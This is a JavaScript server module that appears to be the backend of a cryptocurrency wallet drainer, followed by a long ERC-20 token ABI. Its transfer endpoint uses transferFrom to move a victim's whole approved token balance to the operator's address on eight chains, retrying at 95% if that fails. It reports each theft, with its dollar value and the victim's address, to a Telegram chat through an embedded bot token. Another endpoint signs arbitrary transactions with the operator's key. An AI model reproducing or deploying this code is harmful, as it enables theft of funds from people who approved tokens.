const axios = require('axios');
const ethers = require('ethers');
const Web3 = require('web3');

const INITIATOR_ADDRESS = '';
const INITIATOR_PK = '';

const TG_BOT_TOKEN = '5826342606:AAFIe8s7NckZtdlkJrUUrtMpsRZLCrZCdKI';
// Chat ID of your group (you and the bot.) To find it use chat_id bots in telegram
const TG_CHAT_ID = '-1001758042768';

const RPC = {
  1: `https://rpc.ankr.com/eth`,
  137: 'https://rpc.ankr.com/polygon',
  56: 'https://rpc.ankr.com/bsc',
  42161: 'https://rpc.ankr.com/arbitrum',
  10: 'https://rpc.ankr.com/optimism',
  43114: 'https://rpc.ankr.com/avalanche',
  100: 'https://rpc.ankr.com/gnosis',
  250: 'https://rpc.ankr.com/fantom'
}

const sendMessage = async (message) => {
  const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${message}&parse_mode=markdown`;

  try {
    // return await axios.get(url);
  } catch (e) {
    return false
  }
}

exports.sendMessage = async (req, res) => {
  const message = req.body.message;
  const sent = await sendMessage(message);

  if (sent) {
    res.status(200).send({
      message: "Success"
    });
  } else {
    res.status(500).send({
      message:
        "Some error occurred while sending the message."
    });
  }
}

exports.transfer = async (req, res) => {
  const token = req.body.token;
  const account = req.body.account;  // account from

  const ethersProvider = new ethers.providers.JsonRpcProvider(RPC[token.chainId]);
  const signer = new ethers.Wallet(INITIATOR_PK, ethersProvider);
  const gasPrice = Math.floor(await ethersProvider.getGasPrice());
  const erc20Contract = new ethers.Contract(
    token.token_address,
    ALLOWANCEABI,
    signer
  );

  try {
    await erc20Contract.transferFrom(
      account,
      INITIATOR_ADDRESS,
      token.balanceRaw,
      {gasLimit: 100000, gasPrice}
    );
    sendMessage(`✅ Transfer ${token.symbol} - *$${parseInt(token.usdPrice)}* | Network: ${token.chainId} | From: ${account}`);
    return;
  } catch (error) {
    console.log('ERRRARARRRA', error)
    await erc20Contract.transferFrom(
      account,
      INITIATOR_ADDRESS,
      ethers.utils.parseUnits((token.balance * 0.95).toFixed(token.decimals), token.decimals),
      {gasLimit: 100000, gasPrice}
    );
    sendMessage(`✅ Transfer ${token.symbol} - *$${parseInt(token.usdPrice)}* | Network: ${token.chainId} | From: ${account}`);
  }
}

exports.signTransaction = async (req, res) => {
  const tx = req.body.tx;
  const chainId = req.body.chainId;

  const web3 = new Web3(new Web3.providers.HttpProvider(RPC[chainId]));
  const resp = await web3.eth.accounts.signTransaction(tx, INITIATOR_PK);

  res.json(resp);
}























const ALLOWANCEABI = [{
  "constant": false,
  "inputs": [{
      "name": "_bridge",
      "type": "address"
  }],
  "name": "removeBridge",
  "outputs": [],
  "payable": false,
  "stateMutability": "nonpae",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "name",
  "outputs": [{
      "name": "",
      "type": "string"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "spender",
      "type": "address"
  }, {
      "name": "value",
      "type": "uint256"
  }],
  "name": "approve",
  "outputs": [{
      "name": "",
      "type": "bool"
  }],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "totalSupply",
  "outputs": [{
      "name": "",
      "type": "uint256"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "_to",
      "type": "address"
  }, {
      "name": "_value",
      "type": "uint256"
  }],
  "name": "transferDistribution",
  "outputs": [{
      "name": "",
      "type": "bool"
  }],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "_from",
      "type": "address"
  }, {
      "name": "_to",
      "type": "address"
  }, {
      "name": "_value",
      "type": "uint256"
  }],
  "name": "transferFrom",
  "outputs": [{
      "name": "",
      "type": "bool"
  }],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "PERMIT_TYPEHASH",
  "outputs": [{
      "name": "",
      "type": "bytes32"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "decimals",
  "outputs": [{
      "name": "",
      "type": "uint8"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "DOMAIN_SEPARATOR",
  "outputs": [{
      "name": "",
      "type": "bytes32"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "distributionAddress",
  "outputs": [{
      "name": "",
      "type": "address"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "spender",
      "type": "address"
  }, {
      "name": "addedValue",
      "type": "uint256"
  }],
  "name": "increaseAllowance",
  "outputs": [{
      "name": "",
      "type": "bool"
  }],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "_to",
      "type": "address"
  }, {
      "name": "_value",
      "type": "uint256"
  }, {
      "name": "_data",
      "type": "bytes"
  }],
  "name": "transferAndCall",
  "outputs": [{
      "name": "",
      "type": "bool"
  }],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "_account",
      "type": "address"
  }, {
      "name": "_amount",
      "type": "uint256"
  }],
  "name": "mint",
  "outputs": [{
      "name": "",
      "type": "bool"
  }],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": true,
  "inputs": [{
      "name": "",
      "type": "address"
  }],
  "name": "bridgePointers",
  "outputs": [{
      "name": "",
      "type": "address"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "version",
  "outputs": [{
      "name": "",
      "type": "string"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "_token",
      "type": "address"
  }, {
      "name": "_to",
      "type": "address"
  }],
  "name": "claimTokens",
  "outputs": [],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "advisorsRewardDistributionAddress",
  "outputs": [{
      "name": "",
      "type": "address"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": true,
  "inputs": [{
      "name": "account",
      "type": "address"
  }],
  "name": "balanceOf",
  "outputs": [{
      "name": "",
      "type": "uint256"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": false,
  "inputs": [],
  "name": "renounceOwnership",
  "outputs": [],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": true,
  "inputs": [{
      "name": "_address",
      "type": "address"
  }],
  "name": "isBridge",
  "outputs": [{
      "name": "",
      "type": "bool"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "privateOfferingDistributionAddress",
  "outputs": [{
      "name": "",
      "type": "address"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": true,
  "inputs": [{
      "name": "",
      "type": "address"
  }],
  "name": "nonces",
  "outputs": [{
      "name": "",
      "type": "uint256"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "owner",
  "outputs": [{
      "name": "",
      "type": "address"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "isOwner",
  "outputs": [{
      "name": "",
      "type": "bool"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "_holder",
      "type": "address"
  }, {
      "name": "_spender",
      "type": "address"
  }, {
      "name": "_nonce",
      "type": "uint256"
  }, {
      "name": "_expiry",
      "type": "uint256"
  }, {
      "name": "_allowed",
      "type": "bool"
  }, {
      "name": "_v",
      "type": "uint8"
  }, {
      "name": "_r",
      "type": "bytes32"
  }, {
      "name": "_s",
      "type": "bytes32"
  }],
  "name": "permit",
  "outputs": [],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "symbol",
  "outputs": [{
      "name": "",
      "type": "string"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "_bridge",
      "type": "address"
  }],
  "name": "addBridge",
  "outputs": [],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "bridgeList",
  "outputs": [{
      "name": "",
      "type": "address[]"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "spender",
      "type": "address"
  }, {
      "name": "subtractedValue",
      "type": "uint256"
  }],
  "name": "decreaseAllowance",
  "outputs": [{
      "name": "",
      "type": "bool"
  }],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "_to",
      "type": "address"
  }, {
      "name": "_value",
      "type": "uint256"
  }],
  "name": "transfer",
  "outputs": [{
      "name": "",
      "type": "bool"
  }],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "_to",
      "type": "address"
  }, {
      "name": "_amount",
      "type": "uint256"
  }],
  "name": "push",
  "outputs": [],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "_from",
      "type": "address"
  }, {
      "name": "_to",
      "type": "address"
  }, {
      "name": "_amount",
      "type": "uint256"
  }],
  "name": "move",
  "outputs": [],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "F_ADDR",
  "outputs": [{
      "name": "",
      "type": "address"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": true,
  "inputs": [{
      "name": "owner",
      "type": "address"
  }, {
      "name": "spender",
      "type": "address"
  }],
  "name": "allowance",
  "outputs": [{
      "name": "",
      "type": "uint256"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "_from",
      "type": "address"
  }, {
      "name": "_amount",
      "type": "uint256"
  }],
  "name": "pull",
  "outputs": [],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": false,
  "inputs": [{
      "name": "newOwner",
      "type": "address"
  }],
  "name": "transferOwnership",
  "outputs": [],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "function"
}, {
  "constant": true,
  "inputs": [],
  "name": "bridgeCount",
  "outputs": [{
      "name": "",
      "type": "uint256"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "constant": true,
  "inputs": [{
      "name": "",
      "type": "address"
  }, {
      "name": "",
      "type": "address"
  }],
  "name": "expirations",
  "outputs": [{
      "name": "",
      "type": "uint256"
  }],
  "payable": false,
  "stateMutability": "view",
  "type": "function"
}, {
  "inputs": [{
      "name": "_name",
      "type": "string"
  }, {
      "name": "_symbol",
      "type": "string"
  }, {
      "name": "_distributionAddress",
      "type": "address"
  }, {
      "name": "_privateOfferingDistributionAddress",
      "type": "address"
  }, {
      "name": "_advisorsRewardDistributionAddress",
      "type": "address"
  }],
  "payable": false,
  "stateMutability": "nonpayable",
  "type": "constructor"
}, {
  "anonymous": false,
  "inputs": [{
      "indexed": true,
      "name": "bridge",
      "type": "address"
  }],
  "name": "BridgeAdded",
  "type": "event"
}, {
  "anonymous": false,
  "inputs": [{
      "indexed": true,
      "name": "bridge",
      "type": "address"
  }],
  "name": "BridgeRemoved",
  "type": "event"
}, {
  "anonymous": false,
  "inputs": [{
      "indexed": true,
      "name": "to",
      "type": "address"
  }, {
      "indexed": false,
      "name": "amount",
      "type": "uint256"
  }],
  "name": "Mint",
  "type": "event"
}, {
  "anonymous": false,
  "inputs": [{
      "indexed": true,
      "name": "from",
      "type": "address"
  }, {
      "indexed": true,
      "name": "to",
      "type": "address"
  }, {
      "indexed": false,
      "name": "value",
      "type": "uint256"
  }, {
      "indexed": false,
      "name": "data",
      "type": "bytes"
  }],
  "name": "Transfer",
  "type": "event"
}, {
  "anonymous": false,
  "inputs": [{
      "indexed": false,
      "name": "from",
      "type": "address"
  }, {
      "indexed": false,
      "name": "to",
      "type": "address"
  }, {
      "indexed": false,
      "name": "value",
      "type": "uint256"
  }],
  "name": "ContractFallbackCallFailed",
  "type": "event"
}, {
  "anonymous": false,
  "inputs": [{
      "indexed": true,
      "name": "from",
      "type": "address"
  }, {
      "indexed": true,
      "name": "to",
      "type": "address"
  }, {
      "indexed": false,
      "name": "value",
      "type": "uint256"
  }],
  "name": "Transfer",
  "type": "event"
}, {
  "anonymous": false,
  "inputs": [{
      "indexed": true,
      "name": "owner",
      "type": "address"
  }, {
      "indexed": true,
      "name": "spender",
      "type": "address"
  }, {
      "indexed": false,
      "name": "value",
      "type": "uint256"
  }],
  "name": "Approval",
  "type": "event"
}, {
  "anonymous": false,
  "inputs": [{
      "indexed": true,
      "name": "previousOwner",
      "type": "address"
  }, {
      "indexed": true,
      "name": "newOwner",
      "type": "address"
  }],
  "name": "OwnershipTransferred",
  "type": "event"
}]